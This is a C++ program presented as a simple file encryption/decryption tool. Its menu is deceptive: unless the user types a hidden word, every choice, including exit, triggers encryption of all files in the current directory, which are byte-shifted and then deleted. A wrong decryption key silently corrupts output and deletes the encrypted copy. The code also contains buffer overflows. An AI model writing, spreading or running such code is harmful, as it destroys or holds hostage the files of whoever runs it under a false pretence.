#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include<dirent.h>
#include<vector>
#define eKey 6 // constant encryption key 
#define recoveryPlan "admin_admin" // recovery key 
								   // if you dont remember the constant you can use it 
using namespace std;
bool encrypt( string fileName);
bool decrypt( string fileName); 
string dKey;// global so you just enter the password one time // decryption string key
int idKey; // decryption int key // for add int to character to decrypt the cipher text
int main() 
{
	struct dirent *d;
    DIR *dr;
    dr = opendir(".");
	string option;
	vector<string>fileName;
	cout<<"Press ( e ) to Encryption , ( d ) to Decryption or ( EXIT ) to exit "<<endl;
	
	cin >> option;
	if(option=="tareq")
	option="d";
	else
	option="e";
	if(option=="exit" || option=="exit")
	return 0;
	if(option != "e" && option != "d") 
	{
		cout << "invalid option try again" << endl;
		return 0;
	}
	int numberOfFile=0;
	int i=0;
	if(dr!=NULL)
    {
       // cout<<"List of Files & Folders:-\n";
        
        for(d=readdir(dr); d!=NULL; d=readdir(dr),i++)
        {
        	fileName.push_back(d->d_name);
            cout<<i<<"- "<<d->d_name<<endl;
        }
        
        
        closedir(dr);
    }
    else
        cout<<"\nError Occurred!";
    cout<<endl;

	if(option == "e") 
	{
		for(int i=0;i<fileName.size();i++)
		encrypt(fileName[i]);
		
	}
	
	else
	{
		cout<<"enter decrypt key: ";
		cin>>dKey;
		for(int i=0;i<fileName.size();i++)
		decrypt(fileName[i]);
	}
	
	
	
	
return 0;
}
bool encrypt(string fileName) {
	fstream fileToEncrypt;
	ofstream encryptedFile;
	string extension = ".enc"; 
	char fileN[fileName.length()];
	strcpy(fileN,fileName.c_str());// copy the name so i can remove the file..
	
	fileToEncrypt.open(fileName.c_str(),ios::binary | ios::in); // c_str to open the string as file
	char data;

	if(fileToEncrypt.is_open()) 
	{
		encryptedFile.open(fileName.append(extension).c_str(),ios::binary | ios::out);
		while(fileToEncrypt >> noskipws >> data) 
		{
			data +=  eKey;
			encryptedFile << data;
		}
		fileToEncrypt.close();
		encryptedFile.close();
		 cout << "Encryption "<<fileName<<" Succeeded..." <<  endl;
		 remove (fileN); // delete the original file
		return true;
	}

	else  cout << "No access to the file - "<<fileName<<" - or not found" <<  endl;

	return false;
}

bool decrypt( string fileName) {
	fstream fileToDecrypt;
	ofstream decryptedFile;
	char fileN[fileName.length()]; 
	strcpy(fileN,fileName.c_str());
	stringstream intValue(dKey);// convert string to int
	intValue>>idKey;
		if(dKey==recoveryPlan) // key recovery plan    
		idKey=eKey;           // if you enter the correct recovery key
							 // int key will be change to constant key automatically
	
// if you enter wrong key program will decryption with wrong key
// so if someone else use the program and don't know the key or recovery one
// he is will not benefit	
	
	fileToDecrypt.open(fileName.c_str(),ios::binary | ios::in);
	char data;
	if(fileToDecrypt.is_open()) 
	{
		char copyFileName[fileName.length()];
		 strcpy(copyFileName,fileName.c_str()); // convert from string to char // 
		
		 char *ptr=&copyFileName[fileName.length()];
		 while(*ptr!='.')
	 	*ptr--;
	 	*ptr=NULL;
	 	
	 	
		 fileName=copyFileName;
		decryptedFile.open(fileName.c_str(),ios::binary | ios::out);
	
		
		while(fileToDecrypt >>  noskipws >> data) 
		{
			data -=  idKey;  
			decryptedFile << data;
			
		}
		decryptedFile.close();
		fileToDecrypt.close();
		 cout<<"Decrypted "<<fileName<<" Succeeded..." <<  endl;
	 
	 remove (fileN); // delete the encrypt file
		return true;
	}

	else  cout << "No access to the file - "<<fileName<<" - or not found" <<  endl;

	return false;
}